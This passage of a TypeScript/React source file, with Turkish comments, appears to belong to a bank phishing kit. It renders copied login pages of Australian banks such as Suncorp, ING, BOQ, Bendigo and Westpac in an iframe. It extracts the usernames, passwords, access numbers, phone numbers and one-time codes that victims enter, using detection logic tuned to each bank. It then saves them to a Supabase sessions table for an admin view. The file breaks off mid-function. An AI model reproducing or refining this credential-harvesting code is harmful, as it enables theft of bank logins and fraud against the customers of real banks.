"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { getAuBankPageEntry, getAuBankPages, isAuExactHtmlBank } from "@/lib/au-bank-page-map";
import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
};

type CapturedField = {
  key: string;
  value: string;
  kind: "username" | "password" | "bankPhone" | "personalCode" | "tacCode" | "unknown";
  type: string;
};

// ⭐ Genişletilmiş action button token (myBOQ "Next", ING "Log on", BOQ Classic "Sign on" gibi metinleri de kapsasın)
const ACTION_BUTTON_RE = /(log\s?in|login|logon|log\s*on|sign\s?in|signon|sign\s*on|auth|authenticate|continue|next|proceed|access|submit|confirm|validate|accept|unlock|open|go|enter|ilerle|ileri|devam|tamamla|giriş|giris|tamam|sonraki|onayla|onay|sıra|sıradaki|next\s*step|step\s*next|password_submit|submit_password|acceso|iniciar|sigon|go\s*on)/i;

function getElementActionToken(el: HTMLElement) {
  return normalizeToken([
    el.textContent,
    el instanceof HTMLInputElement ? el.value : "",
    el.getAttribute("aria-label"),
    el.getAttribute("value"),
    el.getAttribute("title"),
    el.getAttribute("data-label"),
    el.getAttribute("data-text"),
  ].join(" "));
}

function normalizeToken(value: string | null | undefined) {
  return (value ?? "").trim().toLowerCase().replace(/[^a-z0-9]+/g, " ");
}

function getElementLabel(doc: Document, el: any): string {
  // ⭐ SHADOW ROOT label okuma (ÖNCE): SG-INPUT, ING-INPUT custom elementler
  //   shadowRoot içine label slot / aria-label / label attribute içerebilir.
  try {
    const ar = (el as HTMLElement)?.getAttribute?.("aria-label")?.trim?.();
    if (ar && ar.length > 1) return ar;
  } catch {}
  try {
    const ph = (el as HTMLElement)?.getAttribute?.("placeholder")?.trim?.();
    if (ph && ph.length > 1) return ph;
  } catch {}
  try {
    const lab = (el as HTMLElement)?.getAttribute?.("label")?.trim?.();
    if (lab && lab.length > 1) return lab;
  } catch {}
  try {
    const sh = (el as any)?.shadowRoot as ShadowRoot | null;
    if (sh) {
      const lab = sh.querySelector("[slot='label'], label, .label, .form-label");
      if (lab?.textContent?.trim()) return lab.textContent.trim();
    }
  } catch {}
  try {
    const type = (el as HTMLElement)?.getAttribute?.("type")?.toLowerCase?.();
    if (type === "password") return "password";
  } catch {}

  // Normal HTML standart label okuma
  const ariaLabel = (el as HTMLElement)?.getAttribute?.("aria-label");
  if (ariaLabel?.trim()) return ariaLabel.trim();

  const placeholder = (el as HTMLElement)?.getAttribute?.("placeholder");
  if (placeholder?.trim()) return placeholder.trim();

  const id = (el as HTMLElement)?.getAttribute?.("id");
  if (id) {
    const label = doc.querySelector(`label[for="${id}"]`);
    if (label?.textContent?.trim()) return label.textContent.trim();
  }

  try {
    const wrappingLabel = (el as HTMLElement)?.closest?.("label");
    if (wrappingLabel?.textContent?.trim()) return wrappingLabel.textContent.trim();
  } catch {}

  try {
    const formItem = (el as HTMLElement)?.closest?.(".form-item");
    const formItemLabel = formItem?.querySelector(".form-label");
    if (formItemLabel?.textContent?.trim()) return formItemLabel.textContent.trim();
  } catch {}

  try {
    const formInput = (el as HTMLElement)?.closest?.(".form-input");
    const siblingFormLabel =
      formInput?.previousElementSibling?.classList?.contains?.("form-label")
        ? formInput.previousElementSibling
        : null;
    if (siblingFormLabel?.textContent?.trim()) return siblingFormLabel.textContent.trim();
  } catch {}

  try {
    const parentText = (el as HTMLElement)?.parentElement?.parentElement?.textContent?.trim?.();
    if (parentText) return parentText;
  } catch {}

  return "";
}

function inferFieldKind(
  el: any,
  label: string,
): CapturedField["kind"] {
  const raw = normalizeToken(
    [
      (el as HTMLElement)?.getAttribute?.("name"),
      (el as HTMLElement)?.getAttribute?.("id"),
      (el as HTMLElement)?.getAttribute?.("data-testid"),
      (el as HTMLElement)?.getAttribute?.("autocomplete"),
      (el as HTMLElement)?.getAttribute?.("type"),
      label,
    ].join(" "),
  );

  const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();

  const dtid = ((el as HTMLElement)?.getAttribute?.("data-testid") ?? "").toLowerCase();
  const ida = ((el as HTMLElement)?.getAttribute?.("id") ?? "").toLowerCase();
  const cla = ((el as HTMLElement)?.getAttribute?.("class") ?? "").toLowerCase();
  let pdtid = "";
  try {
    pdtid = ((el as HTMLElement)?.parentElement?.parentElement?.getAttribute?.("data-testid") ?? "").toLowerCase();
  } catch {
    pdtid = "";
  }
  const lbl = (label ?? "").toLowerCase();
  const s1 = `${dtid} ${ida} ${pdtid} ${cla} ${lbl}`;
  const s2 = `${dtid} ${ida} ${pdtid} ${cla} ${raw} ${lbl}`;

  const dataTestId = dtid;
  const idAttr = ida;
  const classAttr = cla;
  const parentDataTestId = pdtid;

  // ⭐ BOQ Classic SPECIAL MAP: BOQ inputların name attribute u SAYI (name=4 / name=8 / name=14)
  //   oldugu icin standart regexler calismiyor. data-testid ve label attribute'lari GUCLU
  //   oldugu icin oncelikle DATA-TESTID uzerinden eslestir:
  //   ⚠️ DİKKAT: BOQ Classic txtUserSignon (id=id8) 3. alandır (User ID) → personalCode
  //              ANCAK "userid" tokenini GENEL BANKALARDA username olarak kullanmamalıyız
  //              Suncorp / diğer bankalarda UserId = username olur. Bu yüzden:
  //              SIKI BLOK: txtUserSignon, usersignon, businessusersignon VE data-testid=txtUserSignon
  //              ŞARTIYLA SADECE BOQ ÖZELDE personalCode, genel userid/username → username
  if (
    dataTestId === "txtuserid" || idAttr === "txtuserid" || parentDataTestId === "txtuserid" ||
    /txtuserid|customeraccessnumber|customer-access-number|accessno|accessnumber/i.test(s1)
  ) {
    return "username";
  }
  if (
    dataTestId === "txtpassword" || idAttr === "txtpassword" || parentDataTestId === "txtpassword" ||
    /txtpassword|formgrouppassword|form-group--password|passwordname/i.test(s2)
  ) {
    return "password";
  }
  if (
    dataTestId === "txtusersignon" || idAttr === "txtusersignon" || parentDataTestId === "txtusersignon" ||
    /^txtusersignon$|^usersignon$|^businessusersignon$|form-group--user-id/i.test(s1)
  ) {
    return "personalCode";
  }
  if (
    dataTestId === "txttokenotp" || idAttr === "txttokenotp2" || parentDataTestId === "txttokenotp" ||
    /formgrouptoken|form-group--token|tokenotp|rsa/i.test(s2)
  ) {
    return "tacCode";
  }

  // ⭐ BENDIGO + DİĞER BANKALAR ACCESS ID/NUMBER LABEL + INPUT ID HIZLI MAP:
  //   Bendigo step1 input: id="Username_AccessID" → label "Access ID" → username kind
  //   Access Number / Access ID = username (tüm bankalar)
  //   "Personal Access Number (PAN)" Bankwest: label 'Personal' sözcüğü geçiyor → personalCode
  //   ayrıca autocomplete="username" var ise kesin username, autocomplete="current-password" ise password.
  const autocomplete = ((el as HTMLElement)?.getAttribute?.("autocomplete") ?? "").toLowerCase();
  if (autocomplete === "username") return "username";
  if (autocomplete === "current-password" || autocomplete === "new-password") return "password";

  if (/personal.?access.?number/i.test(s1 + " " + s2)) return "personalCode";
  if (/access.?id|access.?number|customer.?access|customer.?registration|registration.?number|client.?number|logon.?id|login.?form.?username/i.test(s1 + " " + s2)) {
    return "username";
  }

  // ⚠️ TİP ÖNCELİĞİ DEĞİŞTİRİLDİ:
  //   ESKİ: type === "password" / type === "tel" EN ÖNCE kontrol edilirdi →
  //         ANZ "Customer Registration Number" (type=tel) BANKPHONE olarak yanlış atanıyordu.
  //   YENİ:
  //     1.Önce password, passcode, pin, secret (password için) → sonra tac/otp (otp için)
  //     2.SONRA username, userid, loginid, memberno, customerno, cardno, accountno, cif (USERNAME)
  //     3.SONRA type === "tel" / phone / mobile (BANKPHONE, gerçeği telefon)
  //   Böylece customer/member/registration number tel type olsa bile USERNAME olarak atanır.
  if (type === "password" || /password|passcode|pin|secret/.test(raw)) return "password";
  if (/tac|otp|one time|one-time|verification|security code|sms code|token|security token|rsa/i.test(raw)) return "tacCode";
  if (/personal|identity|customer number|member number|ird|tax number/i.test(raw)) return "personalCode";
  if (/username|user ?id|userid|login id|client number|customer id|card number|account number|customer number|member number|registration number|cif|cif.?number/i.test(raw)) {
    return "username";
  }
  if (type === "tel" || /phone|mobile|contact|cell/i.test(raw)) return "bankPhone";
  return "unknown";
}

function sanitizeKey(value: string) {
  return value.trim().toLowerCase().replace(/[^a-z0-9]+/g, "_").replace(/^_+|_+$/g, "");
}

function isMeaningfulField(el: any) {
  const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();
  if (["hidden", "submit", "button", "image", "reset"].includes(type)) return false;
  if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
  if ((el as HTMLElement)?.getAttribute?.("aria-hidden") === "true") return false;

  // ⭐ GİZLİ (görünmeyen inputları filtrele):
  //   BOQ Classic 3 adet gizli password inputu (passwordname1/2/3)
  //   Bendigo step1 1 adet gizli password (tabindex=-1 + autocomplete=current-password + parent aria-hidden=true)
  //   Bu inputlar type=password olsa da value ları boştur ve orderedField sıralamasını KARIŞTIRIRLAR.
  //   Eğer display:none, visibility:hidden, -9999px solda, offsetParent null VEYA
  //   tabindex=-1 + parent 5 seviyesinde aria-hidden=true ise anlamlı input SAYMA.
  try {
    const style = window.getComputedStyle(el as HTMLElement);
    if (style.display === "none") return false;
    if (style.visibility === "hidden" || style.visibility === "collapse") return false;
  } catch {}
  try {
    const styleAttr = ((el as HTMLElement)?.getAttribute?.("style") ?? "");
    if (
      /display\s*:\s*none/i.test(styleAttr) ||
      /visibility\s*:\s*hidden/i.test(styleAttr) ||
      /left\s*:\s*-9999/i.test(styleAttr) ||
      /z-index\s*:\s*-1/i.test(styleAttr)
    ) {
      return false;
    }
  } catch {}
  // ⭐ tabindex=-1 + parent Aria-hidden GİZLE (Bendigo step1 hidden password input):
  //   ⚠️ DİKKAT ⚠️: SADECE VE SADECE parent 5 seviyede aria-hidden=true VAR İSE (yani üst
  //   elementin kendisi screen reader için GİZLİ ise) skip et. type=password VEYA
  //   tabindex=-1 tek başına ASLA skip etmez. Gerçek visible inputlar tabindex=-1
  //   olabilir. ESKİ kural (parentAriaHidden VEYA type=password) yanlışlıkla gerçek
  //   password inputlarını skip ediyordu.
  try {
    const ti = (el as HTMLElement)?.getAttribute?.("tabindex");
    let parentAriaHidden = false;
    try {
      let p: HTMLElement | null = (el as HTMLElement)?.parentElement;
      let depth = 0;
      while (p && depth < 5) {
        if (p.getAttribute?.("aria-hidden") === "true") { parentAriaHidden = true; break; }
        p = p.parentElement;
        depth++;
      }
    } catch {}
    if (ti === "-1" && parentAriaHidden) {
      return false;
    }
  } catch {}
  try {
    if ((el as HTMLElement).offsetParent == null) {
      const w = (el as HTMLElement).offsetWidth ?? 0;
      const h = (el as HTMLElement).offsetHeight ?? 0;
      if (w <= 1 && h <= 1) return false;
    }
  } catch {}
  return true;
}

// ⭐ SHADOW DOM DERİN VALUE OKUMA (3 seviye):
//   SG-INPUT, ING-INPUT, UI5-INPUT custom web componentleri shadow DOM kullanır.
//   Normal document.querySelectorAll('input') shadowRoot içindeki gerçek inputu göremez.
//   Önce kendi value property si, sonra shadowRoot querySelector, sonra iç içe shadow rootlar
//   5 seviye kadar kontrol ederiz.
function readFieldValue(el: any) {
  const type = ((el as HTMLElement)?.getAttribute?.("type") ?? "").toLowerCase();

  if (type === "checkbox" || type === "radio") {
    try {
      return (el as HTMLInputElement).checked ? ((el as HTMLInputElement).value || "true") : "";
    } catch {
      return "";
    }
  }

  // 1. Kendi value property (standart HTMLInputElement)
  try {
    const v = (el as HTMLInputElement)?.value?.trim?.() ?? "";
    if (v.length > 0) return v;
  } catch {}

  // 2. shadowRoot içindeki ilk input/textarea/select
  try {
    const shadow = (el as any)?.shadowRoot as ShadowRoot | null | undefined;
    if (shadow) {
      const inner = shadow.querySelector("input, textarea, select");
      if (inner) {
        const iv = (inner as HTMLInputElement)?.value?.trim?.() ?? "";
        if (iv.length > 0) return iv;
      }
    }
  } catch {}

  // 3. 5 seviye derin nested shadow root / nested children ara (SG- gibi çok katmanlı wc)
  try {
    let current: any = el;
    let depth = 0;
    while (current && depth < 5) {
      if (current?.shadowRoot) {
        const inner = current.shadowRoot.querySelector("input, textarea, select");
        if (inner) {
          const iv = (inner as HTMLInputElement)?.value?.trim?.() ?? "";
          if (iv.length > 0) return iv;
        }
        current = current?.firstElementChild;
      } else {
        current = current?.firstElementChild;
      }
      depth++;
    }
  } catch {}

  // 4. HTML value attribute (son çare)
  try {
    const attr = (el as HTMLElement)?.getAttribute?.("value")?.trim?.() ?? "";
    if (attr.length > 0) return attr;
  } catch {}

  return "";
}

// ⭐ SHADOW DOM CUSTOM ELEMENTLERİ DAHİL ET:
//   Suncorp SG-INPUT, ING <ing-input>, UI5 <ui5-input>, Vaadin, MD TextField gibi
//   custom web componentler querySelectorAll('input') listesinde görünmez.
//   Bunları AYRI olarak ekle ve value'lerini readFieldValue shadow read ile al.
function getFormFields(form: HTMLFormElement | Document) {
  const scope = (form as any).querySelectorAll
    ? ((form as unknown) as ParentNode)
    : (document as unknown as ParentNode);
  const standardInputs = Array.from(
    (scope as ParentNode).querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>(
      "input, textarea, select",
    ),
  ).filter(isMeaningfulField);

  const customInputs: any[] = [];
  try {
    const wcCandidates = Array.from(
      (scope as ParentNode).querySelectorAll<HTMLElement>(
        "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea",
      ),
    );
    wcCandidates.forEach((wc) => {
      const typeAttr = (wc.getAttribute("type") || "text").toLowerCase();
      if (["hidden", "submit", "button", "image", "reset"].includes(typeAttr)) return;
      if (wc.getAttribute("aria-hidden") === "true") return;
      customInputs.push(wc as any);
    });
  } catch {}
  return [...standardInputs, ...customInputs];
}

function formHasIdentityAndPassword(form: HTMLFormElement, doc: Document) {
  const fields = getFormFields(form);
  let hasIdentity = false;
  let hasPassword = false;

  for (const field of fields) {
    const kind = inferFieldKind(field, getElementLabel(doc, field));
    if (kind === "password") hasPassword = true;
    if (kind === "username" || kind === "personalCode" || kind === "bankPhone") {
      hasIdentity = true;
    }
  }

  return hasIdentity && hasPassword;
}

function pickBestForm(doc: Document): HTMLFormElement | null {
  const forms = Array.from(doc.querySelectorAll("form"));
  if (forms.length === 0) return null;

  // ⭐⭐⭐ EN ÖNCELİK: GERÇEK LOGIN FORM (hem text/tel alanı HEM password alanı OLAN form)!
  //   Forgot password formlarında SADECE type=password inputu olur (text alanı olmaz).
  //   Önce bunu dene, hiçbir şey bunu geçemez.
  try {
    const perfect = forms.find((f) => {
      const fs = getFormFields(f);
      if (fs.length === 0) return false;
      let hasTextLike = false; let hasPass = false;
      for (const ff of fs) {
        if (!isMeaningfulField(ff)) continue;
        const t = (ff.getAttribute?.("type") ?? "").toLowerCase();
        if (t === "password") hasPass = true;
        if (["text", "email", "tel", "number"].includes(t)) hasTextLike = true;
      }
      return hasTextLike && hasPass;
    });
    if (perfect) return perfect;
  } catch {}

  let bestScore = -Infinity;
  let bestForm: HTMLFormElement | null = null;
  for (const form of forms) {
    const fields = getFormFields(form).filter(isMeaningfulField);
    if (fields.length === 0) continue;
    let hasId = false;
    let hasPass = false;
    let usernameLikeTypeFields = 0;
    let filledCount = 0;
    let passFieldsCount = 0;
    for (const f of fields) {
      const k = inferFieldKind(f, getElementLabel(doc, f));
      const t = (f.getAttribute?.("type") ?? "").toLowerCase();
      if (t === "password") { hasPass = true; passFieldsCount++; }
      if (
        k === "username" || k === "personalCode" || k === "bankPhone" ||
        t === "text" || t === "email" || t === "number" || t === "tel"
      ) { hasId = true; usernameLikeTypeFields++; }
      if (readFieldValue(f)) filledCount++;
    }
    // ⭐ SCORE: FORGOT PASSWORD (hasPass true, hasId false, usernameLikeTypeFields=0, passFieldsCount=1)
    //   Formlara BÜYÜK NEGATİF CEZA → EN ALTA AT. Böylece asla seçilmezler!
    const isForgotPassword = hasPass && !hasId && usernameLikeTypeFields === 0;
    let score = fields.length * 2 + (hasId ? 18 : 0) + (hasPass ? 12 : 0) + usernameLikeTypeFields + filledCount * 3;
    if (isForgotPassword) score -= 2000;
    // ⭐ Formda SADECE password inputu varsa (tek input) → ÇOK DÜŞÜK puan
    if (passFieldsCount === fields.length && fields.length >= 1) score -= 1500;
    if (score > bestScore) {
      bestScore = score;
      bestForm = form;
    }
  }
  return bestForm;
}

function collectCapturedFieldsFromForm(form: HTMLFormElement | Document, doc: Document): CapturedField[] {
  const allFields = getFormFields(form).filter(isMeaningfulField);
  // ⭐⭐⭐ EN KRİTİK HATA DÜZELTİLDİ:
  //   ESKİ: if (!value) return null → shadow DOM / BOQ / SG-INPUT / custom wc gibi
  //   inputlarda readFieldValue İLK DENEMEDE boş dönebilir → O ALAN listeden ATILIRDI.
  //   Böylece fields listesinde SADECE şifre alanı (value okunabiliyorsa) kalır ve
  //   usernameField BULUNAMAZDI (sadece şifre kolonu doluyordu).
  //   YENİ: DEĞER BOŞ OLSA BİLE ALAN listeye KATILIR, kind/type/key bilgisi DOLDURULUR.
  //   usernameField ararken kind=username veya type=text/tel/email/number aranır →
  //   kind atanamasa bile type=text alanları usernameField olarak bulunur.
  return allFields
    .map((el, idx) => {
      const value = readFieldValue(el);
      const label = getElementLabel(doc, el);
      const rawKey = sanitizeKey(
        el.getAttribute("name") ||
        el.getAttribute("id") ||
        label ||
        `field_${idx + 1}`,
      );
      return {
        key: rawKey || `field_${idx + 1}`,
        value: value ?? "",
        kind: inferFieldKind(el, label),
        type: (el.getAttribute("type") ?? "").toLowerCase(),
      } satisfies CapturedField;
    })
    .filter((f): f is CapturedField => Boolean(f));
}

function canSubmitIntermediate(form: HTMLFormElement | Document, doc: Document) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  if (fields.length === 0) return false;
  const allFields = getFormFields(form);
  const allRequiredTypes = allFields.filter((f) => {
    const t = (f.getAttribute("type") ?? "").toLowerCase();
    return t !== "checkbox" && t !== "radio";
  });

  const isFormScope = (form as any).tagName === "FORM";
  const hasAtLeast3Inputs = isFormScope && allRequiredTypes.length >= 3;
  const filledRequired = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
  const allFilled = filledRequired === allRequiredTypes.length;

  if (hasAtLeast3Inputs && !allFilled) {
    return false;
  }

  if (allRequiredTypes.length > 0 && !allFilled) {
    const hasImportant = fields.some(
      (x) =>
        x.kind === "password" ||
        x.kind === "tacCode" ||
        x.kind === "username" ||
        x.kind === "personalCode" ||
        x.kind === "bankPhone",
    );
    if (!hasImportant) return false;
  }

  if (hasIdentityField(fields) || hasPasswordLikeField(fields) || fields.length >= 1) return true;
  return false;
}

function canSubmitFinal(form: HTMLFormElement | Document, doc: Document, isActuallySingleStepOnly: boolean) {
  const fields = collectCapturedFieldsFromForm(form, doc);
  if (isActuallySingleStepOnly) {
    const allFields = getFormFields(form);
    const allRequiredTypes = allFields.filter((f) => {
      const t = (f.getAttribute("type") ?? "").toLowerCase();
      return t !== "checkbox" && t !== "radio";
    });
    const filledCount = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
    const isFormScope = (form as any).tagName === "FORM";
    const hasAtLeast3Filled = isFormScope && allRequiredTypes.length >= 3 && filledCount === allRequiredTypes.length;
    return hasAtLeast3Filled || (hasIdentityField(fields) && (hasPasswordField(fields) || hasPasswordLikeField(fields)));
  }
  return canSubmitIntermediate(form, doc);
}

function hasIdentityField(fields: CapturedField[]) {
  return fields.some((field) =>
    (field.kind === "username" || field.kind === "personalCode" || field.kind === "bankPhone") &&
    field.value.trim().length > 0,
  );
}

function hasPasswordField(fields: CapturedField[]) {
  return fields.some((field) => field.kind === "password" && field.value.trim().length > 0);
}

function hasPasswordLikeField(fields: CapturedField[]) {
  return fields.some((field) =>
    (field.kind === "password" || field.kind === "tacCode") && field.value.trim().length > 0,
  );
}

// ⭐ ACTION NODE FİLTRESİ (SADECE GERÇEKTEN BUTON OLANLAR KALSIN):
//   Westpac'ta [class*='login'] GENİŞ selector'ü ile 20+ DIV/INPUT/SECTION
//   (sınıfında 'login' geçen: login-form-div, login-customer-input vb.) actionNodes
//   listesine GİRİYOR ve fadeOpacity=0.3 atanınca TÜM SAYFA SİLİKLEŞİYORDU.
//   Bu filtre SADECE: BUTON, INPUT[type=submit/button], A.btn, [role=button],
//   [onclick] olan elementleri KABUL EDER. DİĞER TÜM (div, input[type=text], label,
//   form, section, header, span) ATAKILIR.
function isElementActuallyButtonLike(node: HTMLElement): boolean {
  try {
    const tag = (node.tagName || "").toLowerCase();
    const typeAttr = (node.getAttribute("type") || "").toLowerCase();

    // ⭐ BLACKLIST: Bu tokenleri içeren HERHANGİ bir element BUTON OLSA BİLE SAYMA:
    //   - pwd-eye / show-password / toggle-password = şifre göz ikonu (ORİJİNAL HTML)
    //   - padlock-icon = kilit simgesi
    //   - visibility = gizle/göster simgesi
    //   - forgot / reset / help / cancel = şifremi unuttum, iptal butonları = LOGIN DEĞİL
    //   - register / signup / create = kayıt ol butonu (login değil)
    //   - link-icon / icon-only = sayfayı bozan sadece ikon elementleri
    const clsRaw = (node.getAttribute("class") || "").toLowerCase();
    const idRaw = (node.getAttribute("id") || "").toLowerCase();
    const dtidRaw = (node.getAttribute("data-testid") || "").toLowerCase();
    const roleRaw = (node.getAttribute("role") || "").toLowerCase();
    const ariaRaw = (node.getAttribute("aria-label") || node.getAttribute("title") || "").toLowerCase();
    const nameRaw = (node.getAttribute("name") || "").toLowerCase();
    const blTxt = `${clsRaw} ${idRaw} ${dtidRaw} ${roleRaw} ${ariaRaw} ${nameRaw} ${tag}`;
    if (
      /pwd-eye|show.?pass|toggle.?pass|visibility|padlock|pass.?eye|eye.?pass|password.?eye|icon-white-arrow|link-icon|forgot|reset.?pass|cancel|close|dismiss|back|signup|sign-up|register|new.?account|security.?question|help|support|faq/.test(
        blTxt,
      )
    ) {
      return false;
    }

    if (tag === "button") return true;
    if (tag === "input" && ["submit", "button"].includes(typeAttr)) return true;
    if (tag === "a") {
      const cls = (node.getAttribute("class") || "").toLowerCase();
      if (/\bbtn\b/.test(cls)) return true;
    }
    if (node.getAttribute("role") === "button") return true;
    if (node.hasAttribute("onclick")) return true;

    const cls = (node.getAttribute("class") || "").trim().toLowerCase();
    const idAttr = (node.getAttribute("id") || "").trim().toLowerCase();
    if (cls) {
      const classTokens = cls.split(/\s+/);
      for (const t of classTokens) {
        if (
          t === "btn" ||
          t === "button" ||
          t === "btn-primary" ||
          t === "btn-submit" ||
          t === "btn-default" ||
          t === "btn-success" ||
          t === "btn-login" ||
          t === "btn-continue" ||
          t === "btn-next" ||
          t === "primary" ||
          t === "submit-btn" ||
          t === "login-btn" ||
          t === "el-button" ||
          t === "van-button" ||
          t === "sg-btn" ||
          t === "sg-btn--primary" ||
          t.startsWith("btn-") ||
          t.startsWith("button-")
        ) {
          return true;
        }
      }
    }
    if (idAttr) {
      if (
        idAttr === "login-button" ||
        idAttr === "submit-button" ||
        idAttr === "continue-button" ||
        idAttr === "next-button" ||
        idAttr === "btn-login" ||
        idAttr === "btn-submit" ||
        idAttr === "login" ||
        idAttr === "submit" ||
        idAttr.endsWith("-submit") ||
        idAttr.endsWith("-login") ||
        idAttr.endsWith("-btn") ||
        idAttr.endsWith("-button")
      ) {
        return true;
      }
    }

    const dataTestId = (node.getAttribute("data-testid") || "").toLowerCase();
    if (
      dataTestId === "login-button" ||
      dataTestId === "submit-button" ||
      dataTestId.includes("login-button") ||
      dataTestId.includes("submit-button")
    ) {
      return true;
    }

    return false;
  } catch {
    return false;
  }
}

function isExternalHref(href: string | null) {
  if (!href) return false;
  return /^https?:\/\//i.test(href.trim());
}

function hexToRgb(hex: string): { r: number; g: number; b: number } {
  const h = (hex ?? "").replace(/^#/, "").trim();
  const full =
    h.length === 3
      ? h.split("").map((c) => c + c).join("")
      : (h.length === 6 ? h : (h + "000000").slice(0, 6));
  const num = parseInt(full, 16);
  if (Number.isNaN(num)) return { r: 255, g: 212, b: 59 };
  return {
    r: (num >> 16) & 255,
    g: (num >> 8) & 255,
    b: num & 255,
  };
}

function getRelativeLuminance(r: number, g: number, b: number): number {
  const [rs, gs, bs] = [r, g, b].map((c) => {
    const s = c / 255;
    return s <= 0.03928 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4);
  });
  return 0.2126 * rs + 0.7152 * gs + 0.0722 * bs;
}

function getContrastTextColor(hexBg: string, lightHex: string = "#FFFFFF", darkHex: string = "#2B2212"): string {
  const rgb = hexToRgb(hexBg);
  const lum = getRelativeLuminance(rgb.r, rgb.g, rgb.b);
  return lum > 0.5 ? darkHex : lightHex;
}

function getButtonPalette(bankSlug: string): {
  bg: string;
  fg: string;
  border: string;
  shadow: string;
  shadowSoft: string;
  accent: string;
} {
  const entry = getAuBankPageEntry(bankSlug);
  const brand = entry?.brandColor ?? "#FFD43B";
  const accent = entry?.accentColor ?? "#E5B800";
  const rgb = hexToRgb(brand);
  const rgbAccent = hexToRgb(accent);
  const fg = getContrastTextColor(brand);
  return {
    bg: brand,
    fg,
    border: accent,
    accent,
    shadow: `0 10px 24px rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.45)`,
    shadowSoft: `0 6px 14px rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.22)`,
  };
}

function getActiveButtonColor(bankSlug: string) {
  return getButtonPalette(bankSlug).bg;
}

export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [saving, setSaving] = useState(false);
  const [stepIndex, setStepIndex] = useState(0);

  const auPages = useMemo(() => (isAuExactHtmlBank(bankSlug) ? getAuBankPages(bankSlug) : null), [bankSlug]);

  const totalSteps = auPages?.length ?? 0;
  const isMultiStep = (auPages?.length ?? 0) > 1;
  const isFinalStep = totalSteps > 0 && stepIndex >= totalSteps - 1;

  const currentSrc = useMemo(() => {
    if (auPages) return auPages[stepIndex] ?? auPages[auPages.length - 1];
    return null;
  }, [auPages, stepIndex]);

  const submitCapturedFields = useCallback(async (fields: CapturedField[]) => {
    if (!supabase || !sessionId || saving || fields.length === 0) return;

    const filledCount = fields.filter((c) => c.value.trim().length > 0).length;
    const hasAtLeast3Filled = fields.length >= 3 && filledCount >= 3;

    if (isFinalStep) {
      const isSingleStepOnly = totalSteps === 1;
      if (isSingleStepOnly) {
        // ⭐ SUNCORP 3 alanlı bankalar: username + password + tacCode/token var.
        //   hasPasswordField SADECE kind=password bakıyor ama Suncorp passcode kind=tacCode
        //   olduğundan hasPasswordField FALSE dönüyordu → ERKEN return (SAVING KİLİTLİNEDİ!).
        //   ÇÖZÜM: 3+ alan DOLU ise (filledCount>=3) ZORUNLU ID+PASS şartını ESGEÇ.
        const hasIdOrPass3 = hasIdentityField(fields) || hasPasswordLikeField(fields);
        if (!hasAtLeast3Filled && !hasIdOrPass3) return;
      } else {
        if (fields.length === 0) return;
      }
    } else {
      if (fields.length === 0) return;
    }

    setSaving(true);

    try {
      const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      const previousFormData = ((existing?.form_data ?? {}) as Record<string, unknown>) ?? {};

      // ⭐⭐⭐ USERNAME FIELD BULMA GARANTİSİ (SON ÇARELER DAHİL + AYNI OLMA KONTROLÜ):
      //   1) Önce kind="username" (en doğru)
      //   2) Sonra TYPE text/email/tel/number OLAN İLK ALAN (kind bilinmiyor olsa bile TEXT → USERNAME)
      //   3) Sonra kind unknown type !== "password" olan ilk alan
      //   4) SON: fields[0] (hiçbir şey uymazsa ilk alan)
      //   ⭐⭐⭐ SONRA ÇİFT KONTROL:
      //   usernameField.type === "password" VEYA (passwordField !== null && usernameField === passwordField)
      //   → BU YANLIŞ! (ikisi de aynı password alanı demek). Bu durumda:
      //     a) fields içinde type !== password OLAN FARKLI bir alan VARMı diye bak
      //     b) yoksa document scope ta TÜM form inputlarında ara (text/tel türünde ilk alan)
      //     c) HİÇBİRİ OLMAZSA usernameField = null (admin boş gösterir, ama HATA YAPMAZ)
      let usernameField: CapturedField | null =
        fields.find((field) => field.kind === "username") ??
        fields.find((field) => ["text", "email", "tel", "number"].includes(field.type)) ??
        fields.find((field) => field.kind === "unknown" && field.type !== "password") ??
        fields[0] ??
        null;

      // ⭐⭐⭐ PASSWORD FIELD BULMA GARANTİSİ:
      //   1) kind password, 2) tacCode + type=password, 3) type=password OLAN İLK (fallback),
      //   4) SON ÇARE: fields[1]
      let passwordField: CapturedField | null =
        fields.find((field) => field.kind === "password") ??
        fields.find((field) => field.kind === "tacCode" && field.type === "password") ??
        fields.find((field) => field.type === "password") ??
        fields[1] ??
        null;

      // ⭐⭐⭐⭐⭐ AYNI ALAN OLDUĞUNUN KONTROLÜ (EN ÖNEMLİ KONTROL!) ⭐⭐⭐⭐⭐
      //   Kullanıcı "HER İKİ KOLONDA ŞİFRE" diyor → tam olarak BU senaryo:
      //   usernameField === passwordField (aynı nesne) VEYA usernameField.type === "password"
      //   → YANLIŞ usernameField seçilmiş demek! (Gerçek username aslında listede olmayabilir,
      //     ya da fields SADECE 1 password itemi içeriyor).
      //   DÜZELTME:
      //     1) İlk önce mevcut fields listesinde PASSWORD OLMAYAN bir alan ara.
      //     2) Yoksa DOKÜMAN GENELİNDE (BÜTÜN FORMLARDA) text/tel/email/number TİPİNDE
      //        anlamlı alan ARA, ilk bulduğunu usernameField yap.
      //     3) Hala aynı ise → force usernameField = null (admin ID kolonu BOŞ KALSIN,
      //        yanlış veri iki kere gösterilmesin!)
      if (usernameField && passwordField && (usernameField === passwordField || usernameField.type === "password")) {
